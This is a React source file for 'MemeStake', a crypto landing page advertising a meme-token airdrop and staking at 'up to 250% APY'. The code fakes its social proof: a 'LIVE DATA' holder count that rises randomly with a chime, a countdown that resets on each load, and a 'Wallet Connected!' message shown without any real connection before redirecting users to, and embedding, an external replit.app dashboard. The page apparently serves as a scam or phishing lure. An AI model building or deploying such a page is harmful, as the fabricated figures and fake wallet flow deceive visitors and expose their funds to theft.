import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Card, CardContent } from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";
import { FaTwitter, FaTelegram, FaMedium, FaYoutube } from "react-icons/fa";
import memeStakeLogo from "@assets/ChatGPT Image Aug 27, 2025, 09_52_01 PM_1756366058294.png";

const i18n = {
  en: { features: 'Features', pricing: 'Pricing', blog: 'Blog', about: 'About', contact: 'Contact', whitepaper: 'Whitepaper', getStarted: 'Connect Wallet', why: 'Why' },
  hi: { features: 'विशेषताएँ', pricing: 'मूल्य', blog: 'ब्लॉग', about: 'परिचय', contact: 'संपर्क', whitepaper: 'व्हाइटपेपर', getStarted: 'वॉलेट कनेक्ट करें', why: 'क्यों' },
  es: { features: 'Funciones', pricing: 'Precios', blog: 'Blog', about: 'Acerca de', contact: 'Contacto', whitepaper: 'Libro Blanco', getStarted: 'Conectar Billetera', why: 'Por qué' },
  fr: { features: 'Fonctionnalités', pricing: 'Tarifs', blog: 'Blog', about: 'À propos', contact: 'Contact', whitepaper: 'Livre Blanc', getStarted: 'Connecter Portefeuille', why: 'Pourquoi' },
  de: { features: 'Funktionen', pricing: 'Preise', blog: 'Blog', about: 'Über uns', contact: 'Kontakt', whitepaper: 'Whitepaper', getStarted: 'Wallet Verbinden', why: 'Warum' },
  ja: { features: '機能', pricing: '価格', blog: 'ブログ', about: '概要', contact: 'お問い合わせ', whitepaper: 'ホワイトペーパー', getStarted: 'ウォレット接続', why: 'なぜ' },
  ko: { features: '기능', pricing: '가격', blog: '블로그', about: '소개', contact: '문의', whitepaper: '백서', getStarted: '지갑 연결', why: '왜' },
  zh: { features: '功能', pricing: '价格', blog: '博客', about: '关于', contact: '联系', whitepaper: '白皮书', getStarted: '连接钱包', why: '为什么' },
  pt: { features: 'Recursos', pricing: 'Preços', blog: 'Blog', about: 'Sobre', contact: 'Contato', whitepaper: 'Whitepaper', getStarted: 'Conectar Carteira', why: 'Por que' },
  ru: { features: 'Функции', pricing: 'Цены', blog: 'Блог', about: 'О нас', contact: 'Контакты', whitepaper: 'Белая книга', getStarted: 'Подключить Кошелек', why: 'Почему' },
  ar: { features: 'الميزات', pricing: 'التسعير', blog: 'المدونة', about: 'حولنا', contact: 'اتصل بنا', whitepaper: 'الورقة البيضاء', getStarted: 'ربط المحفظة', why: 'لماذا' },
  it: { features: 'Caratteristiche', pricing: 'Prezzi', blog: 'Blog', about: 'Chi siamo', contact: 'Contatti', whitepaper: 'Whitepaper', getStarted: 'Connetti Wallet', why: 'Perché' }
};

export default function Home() {
  const [theme, setTheme] = useState('dark');
  const [language, setLanguage] = useState('en');
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [showBackToTop, setShowBackToTop] = useState(false);
  const [newsletterEmail, setNewsletterEmail] = useState('');
  const [formErrors, setFormErrors] = useState<Record<string, string>>({});
  const [airdropTime, setAirdropTime] = useState({ days: 30, hours: 12, minutes: 0, seconds: 4 });
  const [tokenHolders, setTokenHolders] = useState(47832);
  const [walletModalOpen, setWalletModalOpen] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState<string>('');
  const { toast } = useToast();

  const walletOptions = [
    { name: 'MetaMask', icon: '🦊' },
    { name: 'Trust Wallet', icon: '🛡️' },
    { name: 'Binance Web3 Wallet', icon: '⬡' },
    { name: 'SafePal', icon: '🔒' },
    { name: 'TokenPocket', icon: '🪙' }
  ];

  useEffect(() => {
    const savedTheme = localStorage.getItem('theme') || 'dark';
    setTheme(savedTheme);
    if (savedTheme === 'dark') {
      document.documentElement.classList.add('dark');
    } else {
      document.documentElement.classList.remove('dark');
    }
  }, []);

  useEffect(() => {
    const savedLang = localStorage.getItem('language');
    const browserLang = navigator.language.substring(0, 2);
    const initialLang = savedLang || (i18n[browserLang as keyof typeof i18n] ? browserLang : 'en');
    setLanguage(initialLang);
  }, []);

  const toggleTheme = () => {
    const newTheme = theme === 'dark' ? 'light' : 'dark';
    setTheme(newTheme);
    localStorage.setItem('theme', newTheme);
    if (newTheme === 'dark') {
      document.documentElement.classList.add('dark');
    } else {
      document.documentElement.classList.remove('dark');
    }
  };

  const handleLanguageChange = (newLang: string) => {
    setLanguage(newLang);
    localStorage.setItem('language', newLang);
  };

  useEffect(() => {
    const handleScroll = () => setShowBackToTop(window.scrollY > 600);
    window.addEventListener('scroll', handleScroll);
    return () => window.removeEventListener('scroll', handleScroll);
  }, []);

  const validateEmail = (email: string) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);

  const handleNewsletterSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newsletterEmail.trim()) {
      setFormErrors({ newsletter: 'Please enter your email' });
      return;
    }
    if (!validateEmail(newsletterEmail)) {
      setFormErrors({ newsletter: 'Please enter a valid email address' });
      return;
    }
    setFormErrors({});
    toast({ title: "Subscribed successfully!", description: "Welcome to the MemeStake community!" });
    setNewsletterEmail('');
  };

  const playPeacefulChime = () => {
    try {
      const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
      const createChimeNote = (frequency: number, startTime: number, duration: number) => {
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();
        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);
        oscillator.frequency.value = frequency;
        oscillator.type = 'sine';
        gainNode.gain.setValueAtTime(0, startTime);
        gainNode.gain.linearRampToValueAtTime(0.002, startTime + 0.05);
        gainNode.gain.exponentialRampToValueAtTime(0.00005, startTime + duration);
        oscillator.start(startTime);
        oscillator.stop(startTime + duration);
      };
      const now = audioContext.currentTime;
      createChimeNote(329.63, now, 2.0);
      createChimeNote(392.00, now + 0.6, 1.8);
      createChimeNote(523.25, now + 1.2, 1.5);
    } catch (e) {
      console.log('Audio not supported');
    }
  };

  const handleWalletSelect = (walletName: string) => {
    setSelectedWallet(walletName);
    setTimeout(() => {
      setWalletModalOpen(false);
      toast({ title: "Wallet Connected!", description: `Successfully connected to ${walletName}` });
      setTimeout(() => {
        window.location.href = 'https://mems-ui-server-dashbaord.replit.app/';
      }, 1000);
    }, 1000);
  };

  const handleStakingClick = () => {
    toast({
      title: "🚀 Staking Program Coming Soon!",
      description: "Staking will launch immediately after the airdrop ends. Up to 250% APY rewards await!"
    });
  };

  useEffect(() => {
    const tokenTimer = setInterval(() => {
      setTokenHolders(prev => {
        const shouldIncrease = Math.random() > 0.2;
        if (shouldIncrease) {
          const increase = Math.floor(Math.random() * 5) + 1;
          playPeacefulChime();
          return prev + increase;
        }
        return prev;
      });
    }, 5000);
    return () => clearInterval(tokenTimer);
  }, []);

  useEffect(() => {
    setAirdropTime({ days: 30, hours: 12, minutes: 0, seconds: 4 });
    const timer = setInterval(() => {
      setAirdropTime(prev => ({
        ...prev,
        seconds: prev.seconds > 0 ? prev.seconds - 1 : 59,
        minutes: prev.seconds === 0 && prev.minutes > 0 ? prev.minutes - 1 : prev.minutes,
        hours: prev.seconds === 0 && prev.minutes === 0 && prev.hours > 0 ? prev.hours - 1 : prev.hours,
        days: prev.seconds === 0 && prev.minutes === 0 && prev.hours === 0 && prev.days > 0 ? prev.days - 1 : prev.days
      }));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const scrollToTop = () => window.scrollTo({ top: 0, behavior: 'smooth' });
  const t = i18n[language as keyof typeof i18n] || i18n.en;

  return (
    <div className="bg-background text-foreground">
      {/* Header */}
      <header className="sticky top-0 backdrop-blur-md border-b z-30" style={{background: 'rgba(15, 20, 35, 0.95)', borderColor: 'rgba(255, 215, 0, 0.15)'}}>
        <nav className="container py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-2">
              <img src={memeStakeLogo} alt="MemeStake Logo" className="w-16 h-16 rounded-lg shadow-lg" style={{filter: 'drop-shadow(0 4px 15px rgba(255, 215, 0, 0.2))'}} />
              <span className="text-xl font-bold" style={{fontFamily: 'Space Grotesk, Inter, sans-serif', fontWeight: '700', color: '#ffd700'}}>MemeStake</span>
            </div>
            <div className="hidden md:flex items-center justify-center flex-1 space-x-8">
              <a href="#about" className="nav-link text-gray-300 hover:text-white transition-all duration-200" style={{fontFamily: 'Inter, sans-serif', fontWeight: '500'}}>{t.about}</a>
              <a href="#whitepaper" className="nav-link text-gray-300 hover:text-white transition-all duration-200" style={{fontFamily: 'Inter, sans-serif', fontWeight: '500'}}>{t.whitepaper}</a>
              <a href="#roadmap" className="nav-link text-gray-300 hover:text-white transition-all duration-200" style={{fontFamily: 'Inter, sans-serif', fontWeight: '500'}}>Roadmap</a>
            </div>
            <div className="flex items-center space-x-4">
              <Select value={language} onValueChange={handleLanguageChange}>
                <SelectTrigger className="w-16 h-8 text-sm border" style={{background: 'rgba(255, 255, 255, 0.05)', borderColor: 'rgba(255, 215, 0, 0.2)', color: 'white'}}>
                  <SelectValue />
                </SelectTrigger>
                <SelectContent style={{background: 'rgba(15, 20, 35, 0.98)', borderColor: 'rgba(255, 215, 0, 0.2)'}}>
                  <SelectItem value="en" style={{color: 'white'}}>🇺🇸 EN</SelectItem>
                  <SelectItem value="es" style={{color: 'white'}}>🇪🇸 ES</SelectItem>
                  <SelectItem value="fr" style={{color: 'white'}}>🇫🇷 FR</SelectItem>
                  <SelectItem value="de" style={{color: 'white'}}>🇩🇪 DE</SelectItem>
                </SelectContent>
              </Select>
              <Button variant="outline" size="sm" onClick={toggleTheme} className="p-2 h-8 w-8 border" style={{background: 'rgba(255, 255, 255, 0.05)', borderColor: 'rgba(255, 215, 0, 0.2)', color: 'white'}}>
                {theme === 'dark' ? '☀️' : '🌙'}
              </Button>
              <Button onClick={() => setWalletModalOpen(true)} className="px-6 py-2 rounded-lg text-sm font-semibold transition-all duration-300 hover:scale-105" style={{background: '#ffd700', color: '#0a0e1a', fontWeight: '600', fontFamily: 'Space Grotesk, sans-serif', border: '1px solid rgba(255, 215, 0, 0.3)', boxShadow: '0 4px 15px rgba(255, 215, 0, 0.2)'}}>
                {t.getStarted}
              </Button>
              <button className="md:hidden hamburger" onClick={() => setMobileMenuOpen(!mobileMenuOpen)}>
                <span></span><span></span><span></span>
              </button>
            </div>
          </div>
        </nav>
      </header>

      {/* Airdrop Banner */}
      <div className="w-full py-2 px-4 text-center" style={{background: 'linear-gradient(90deg, rgba(255, 215, 0, 0.1) 0%, rgba(0, 191, 255, 0.1) 100%)', borderBottom: '1px solid rgba(255, 215, 0, 0.2)'}}>
        <p className="text-sm text-white/80">🎁 <span style={{color: '#ffd700'}}>Limited Airdrop:</span> Connect your wallet now to claim free MEME tokens • <span style={{color: '#ffd700'}}>Join 47K+ holders</span> • Staking rewards up to 250% APY</p>
      </div>

      {/* Mobile Menu */}
      {mobileMenuOpen && (
        <div className="mobile-menu active">
          <div className="p-6">
            <div className="flex flex-col space-y-6 mt-16">
              <a href="#about" className="text-xl font-medium text-white hover:text-primary transition-colors" onClick={() => setMobileMenuOpen(false)}>{t.about}</a>
              <Button className="mt-4" onClick={() => setWalletModalOpen(true)} style={{background: '#ffd700', color: '#0a0e1a', fontWeight: '600', fontFamily: 'Space Grotesk, sans-serif', border: '1px solid rgba(255, 215, 0, 0.3)'}}>
                {t.getStarted}
              </Button>
            </div>
          </div>
        </div>
      )}

      {/* Hero Section */}
      <section className="section-padding text-center relative">
        <div className="container">
          <div className="text-center max-w-4xl mx-auto">
            <h1 className="text-5xl md:text-6xl lg:text-7xl xl:text-8xl font-bold mb-8 leading-tight" style={{fontFamily: 'Space Grotesk, Inter, sans-serif', fontWeight: '800'}}>
              Stake Memes. <span className="text-primary">Earn Big.</span>
            </h1>
            <p className="text-xl md:text-2xl lg:text-3xl text-gray-300 mb-12 leading-relaxed max-w-3xl mx-auto" style={{fontFamily: 'Inter, sans-serif', fontWeight: '400'}}>
              Turn your favorite meme tokens into daily passive income.
            </p>
            <div className="flex flex-col sm:flex-row gap-6 justify-center">
              <Button size="lg" className="text-lg px-8 py-4" onClick={handleStakingClick} style={{background: '#ffd700', color: '#0a0e1a', fontWeight: '600', fontFamily: 'Space Grotesk, sans-serif', border: '1px solid rgba(255, 215, 0, 0.3)'}}>
                🚀 Start Staking
              </Button>
              <Button asChild variant="outline" size="lg" className="text-lg px-8 py-4">
                <a href="#faq">📄 Learn More</a>
              </Button>
            </div>
          </div>
        </div>
      </section>

      {/* Countdown Section */}
      <section className="py-16 relative">
        <div className="container">
          <div className="text-center">
            <Card className="p-8 max-w-4xl mx-auto relative overflow-hidden">
              <div className="absolute inset-0 bg-gradient-to-br from-primary/10 to-secondary/10"></div>
              <div className="relative z-10">
                <div className="flex items-center justify-center mb-4">
                  <div className="chip gold mr-4">🎁 AIRDROP</div>
                  <div className="chip">🔥 EXCLUSIVE</div>
                </div>
                <h2 className="text-3xl md:text-4xl font-bold mb-4" style={{color: '#FFD700', fontFamily: 'Space Grotesk, Inter, sans-serif'}}>
                  🚀 Phase 2: Staking Program
                </h2>
                <p className="text-lg text-muted-foreground mb-6 max-w-2xl mx-auto">
                  Get ready for the biggest meme token airdrop of 2025! Early participants get exclusive bonuses.
                </p>

                {/* Countdown Timer */}
                <div className="glass-card p-8 rounded-2xl border-2 relative" style={{background: 'rgba(255, 255, 255, 0.02)', border: '2px solid rgba(255, 215, 0, 0.3)', boxShadow: '0 0 30px rgba(255, 215, 0, 0.2), 0 0 60px rgba(0, 191, 255, 0.1)'}}>
                  <div className="flex items-center space-x-6 text-center">
                    <div className="flex items-center space-x-2">
                      <span className="text-4xl md:text-5xl font-bold animated-gradient" style={{background: 'linear-gradient(-45deg, #ffd700, #00bfff, #ffd700, #00bfff)', backgroundClip: 'text', WebkitBackgroundClip: 'text', color: 'transparent'}}>
                        {String(airdropTime.days).padStart(2, '0')}
                      </span>
                      <span className="text-sm md:text-base font-medium" style={{color: '#ffd700'}}>DAYS</span>
                    </div>
                    <div className="text-3xl md:text-4xl text-cyan-400 animate-pulse">:</div>
                    <div className="flex items-center space-x-2">
                      <span className="text-4xl md:text-5xl font-bold animated-gradient" style={{background: 'linear-gradient(-45deg, #00bfff, #ffd700, #00bfff, #ffd700)', backgroundClip: 'text', WebkitBackgroundClip: 'text', color: 'transparent'}}>
                        {String(airdropTime.hours).padStart(2, '0')}
                      </span>
                      <span className="text-sm md:text-base font-medium" style={{color: '#ffd700'}}>HRS</span>
                    </div>
                    <div className="text-3xl md:text-4xl text-cyan-400 animate-pulse">:</div>
                    <div className="flex items-center space-x-2">
                      <span className="text-4xl md:text-5xl font-bold animated-gradient" style={{background: 'linear-gradient(-45deg, #ffd700, #00bfff, #ffd700, #00bfff)', backgroundClip: 'text', WebkitBackgroundClip: 'text', color: 'transparent'}}>
                        {String(airdropTime.minutes).padStart(2, '0')}
                      </span>
                      <span className="text-sm md:text-base font-medium" style={{color: '#ffd700'}}>MIN</span>
                    </div>
                    <div className="text-3xl md:text-4xl text-cyan-400 animate-pulse">:</div>
                    <div className="flex items-center space-x-2">
                      <span className="text-4xl md:text-5xl font-bold animated-gradient" style={{background: 'linear-gradient(-45deg, #00bfff, #ffd700, #00bfff, #ffd700)', backgroundClip: 'text', WebkitBackgroundClip: 'text', color: 'transparent'}}>
                        {String(airdropTime.seconds).padStart(2, '0')}
                      </span>
                      <span className="text-sm md:text-base font-medium" style={{color: '#ffd700'}}>S</span>
                    </div>
                  </div>
                </div>

                <div className="mt-8">
                  <Button onClick={() => setWalletModalOpen(true)} className="text-xl px-10 py-6 rounded-xl font-bold transition-all duration-300 hover:scale-105" style={{background: '#ffd700', color: '#0a0e1a', fontWeight: '700', fontFamily: 'Space Grotesk, sans-serif', border: '2px solid rgba(255, 215, 0, 0.3)', boxShadow: '0 8px 25px rgba(255, 215, 0, 0.3)'}}>
                    🎁 Join Airdrop
                  </Button>
                </div>
              </div>
            </Card>
          </div>
        </div>
      </section>

      {/* Live Stats */}
      <section className="py-4 relative overflow-hidden" style={{background: 'linear-gradient(90deg, rgba(255, 215, 0, 0.15) 0%, rgba(0, 191, 255, 0.15) 50%, rgba(255, 215, 0, 0.15) 100%)'}}>
        <div className="container">
          <div className="flex items-center justify-center">
            <div className="w-3 h-3 rounded-full mr-2" style={{background: '#00ff88', animation: 'pulse 1s infinite'}}></div>
            <span className="text-sm font-medium" style={{color: '#ffd700'}}>🔴 LIVE DATA</span>
          </div>
        </div>
        <div className="container mt-8">
          <div className="flex justify-center relative">
            <div className="glass-card p-6 rounded-2xl border-2 relative overflow-hidden" style={{background: 'rgba(255, 255, 255, 0.03)', border: '2px solid rgba(255, 215, 0, 0.3)', boxShadow: '0 0 20px rgba(255, 215, 0, 0.2)'}}>
              <div className="text-center">
                <div className="text-4xl md:text-5xl font-bold mb-2 animated-gradient" style={{background: 'linear-gradient(-45deg, #ffd700, #00bfff, #ffd700, #00bfff)', backgroundClip: 'text', WebkitBackgroundClip: 'text', color: 'transparent'}}>
                  {tokenHolders.toLocaleString()}
                </div>
                <div className="text-lg font-semibold text-white mb-1">🏆 Total Token Holders</div>
                <div className="text-sm" style={{color: '#00ff88'}}>↗ Live Updates Every 5s</div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Dashboard */}
      <section className="section-padding crypto-bg relative">
        <div className="container">
          <div className="text-center mb-16">
            <h2 className="text-3xl md:text-4xl font-bold mb-4">Your Staking Dashboard</h2>
            <p className="text-lg text-muted-foreground max-w-2xl mx-auto">Track your meme token portfolio and maximize your passive income</p>
          </div>
          <div className="max-w-6xl mx-auto">
            <iframe src="https://mems-ui-server-dashbaord.replit.app/" className="w-full h-[800px] rounded-lg border border-border" style={{background: 'linear-gradient(135deg, rgba(15, 20, 35, 0.8) 0%, rgba(30, 15, 60, 0.8) 100%)', border: '2px solid rgba(255, 215, 0, 0.2)'}} />
          </div>
        </div>
      </section>

      {/* Newsletter */}
      <section className="section-padding crypto-bg">
        <div className="container">
          <div className="text-center max-w-2xl mx-auto">
            <h2 className="text-3xl md:text-4xl font-bold mb-4">Subscribe to our newsletter</h2>
            <p className="text-lg text-muted-foreground mb-8">Get product news, tips, and the occasional meme. Unsubscribe anytime.</p>
            <form onSubmit={handleNewsletterSubmit} className="flex flex-col sm:flex-row gap-4 max-w-md mx-auto">
              <Input type="email" placeholder="Enter your email" value={newsletterEmail} onChange={(e) => setNewsletterEmail(e.target.value)} className="flex-1" />
              <Button type="submit" className="whitespace-nowrap">Subscribe</Button>
            </form>
            {formErrors.newsletter && <div className="text-destructive text-sm mt-2">{formErrors.newsletter}</div>}
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="py-16" style={{background: 'linear-gradient(135deg, #0a0e1a 0%, #1a1f2e 100%)'}}>
        <div className="container">
          <div className="border-t border-border pt-8">
            <div className="flex flex-col items-center space-y-6">
              <div className="flex items-center space-x-6">
                <a href="https://twitter.com/memestake" target="_blank" rel="noopener noreferrer" className="w-10 h-10 rounded-full flex items-center justify-center transition-all duration-200 hover:scale-110" style={{background: 'rgba(255, 215, 0, 0.1)', border: '1px solid rgba(255, 215, 0, 0.3)'}}>
                  <FaTwitter className="text-lg" style={{color: '#ffd700'}} />
                </a>
                <a href="https://t.me/memestake_official" target="_blank" rel="noopener noreferrer" className="w-10 h-10 rounded-full flex items-center justify-center transition-all duration-200 hover:scale-110" style={{background: 'rgba(0, 191, 255, 0.1)', border: '1px solid rgba(0, 191, 255, 0.3)'}}>
                  <FaTelegram className="text-lg" style={{color: '#00bfff'}} />
                </a>
                <a href="https://medium.com/@memestake" target="_blank" rel="noopener noreferrer" className="w-10 h-10 rounded-full flex items-center justify-center transition-all duration-200 hover:scale-110" style={{background: 'rgba(255, 255, 255, 0.1)', border: '1px solid rgba(255, 255, 255, 0.3)'}}>
                  <FaMedium className="text-lg text-white" />
                </a>
                <a href="https://youtube.com/@memestake" target="_blank" rel="noopener noreferrer" className="w-10 h-10 rounded-full flex items-center justify-center transition-all duration-200 hover:scale-110" style={{background: 'rgba(255, 0, 0, 0.1)', border: '1px solid rgba(255, 0, 0, 0.3)'}}>
                  <FaYoutube className="text-lg" style={{color: '#ff0000'}} />
                </a>
              </div>
              <div className="flex flex-col md:flex-row justify-between items-center w-full text-center md:text-left">
                <div className="text-sm text-muted-foreground mb-4 md:mb-0">© 2025 MemeStake. All rights reserved.</div>
                <div className="flex items-center space-x-4 text-sm">
                  <div className="flex items-center space-x-2">
                    <div className="w-2 h-2 rounded-full" style={{background: '#00ff88'}}></div>
                    <span className="text-muted-foreground">System Status: Online</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </footer>

      {/* Wallet Modal */}
      {walletModalOpen && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 p-4" onClick={() => setWalletModalOpen(false)}>
          <div className="bg-gradient-to-br from-slate-900/95 to-indigo-900/95 rounded-2xl p-8 max-w-md w-full mx-auto backdrop-blur-xl border" style={{background: 'linear-gradient(135deg, rgba(15, 10, 35, 0.95) 0%, rgba(30, 15, 60, 0.95) 100%)', border: '1px solid rgba(255, 255, 255, 0.1)', boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.4)'}} onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between mb-6">
              <div className="flex items-center space-x-3">
                <img src={memeStakeLogo} alt="MemeStake Logo" className="w-8 h-8 rounded-lg" style={{filter: 'drop-shadow(0 2px 8px rgba(255, 215, 0, 0.1))'}} />
                <h2 className="text-xl font-semibold text-white">Connect Wallet</h2>
              </div>
              <button onClick={() => setWalletModalOpen(false)} className="w-8 h-8 rounded-full flex items-center justify-center hover:bg-white/10 transition-colors">
                <span className="text-white text-lg">×</span>
              </button>
            </div>
            <div className="flex items-center justify-center mb-6">
              <div className="inline-flex items-center space-x-2 px-4 py-2 rounded-full text-sm font-medium" style={{background: 'rgba(255, 215, 0, 0.1)', border: '1px solid rgba(255, 215, 0, 0.3)', color: '#ffd700'}}>
                <span className="text-xs">⬡</span>
                <span>BNB Smart Chain (BEP20)</span>
              </div>
            </div>
            <p className="text-center text-gray-300 mb-8 text-base">Select a BNB Smart Chain compatible wallet</p>
            <div className="grid gap-3 mb-6">
              {walletOptions.map((wallet) => (
                <button key={wallet.name} onClick={() => handleWalletSelect(wallet.name)} className="flex items-center justify-between p-4 rounded-xl border transition-all duration-200 group hover:scale-[1.02]" style={{background: selectedWallet === wallet.name ? 'rgba(255, 255, 255, 0.05)' : 'rgba(255, 255, 255, 0.02)', border: selectedWallet === wallet.name ? '1px solid #00bfff' : '1px solid rgba(255, 255, 255, 0.1)', boxShadow: selectedWallet === wallet.name ? '0 0 20px rgba(0, 191, 255, 0.2)' : 'none'}}>
                  <div className="flex items-center space-x-3">
                    <span className="text-2xl">{wallet.icon}</span>
                    <span className="font-medium text-white group-hover:text-black transition-colors">{wallet.name}</span>
                  </div>
                  {selectedWallet === wallet.name && <span className="text-cyan-400">✓</span>}
                </button>
              ))}
            </div>
            <div className="flex flex-col sm:flex-row items-center justify-between text-sm text-gray-400 pt-4 border-t border-white/10 gap-2">
              <a href="#" className="hover:text-cyan-400 transition-colors">Having trouble?</a>
              <span>More wallets via WalletConnect</span>
            </div>
          </div>
        </div>
      )}

      {/* Back to Top */}
      {showBackToTop && (
        <Button className="fixed bottom-6 right-6 bg-primary text-primary-foreground p-3 rounded-full shadow-lg z-40 hover:opacity-90" onClick={scrollToTop}>
          <span className="text-lg">↑</span>
        </Button>
      )}
    </div>
  );
}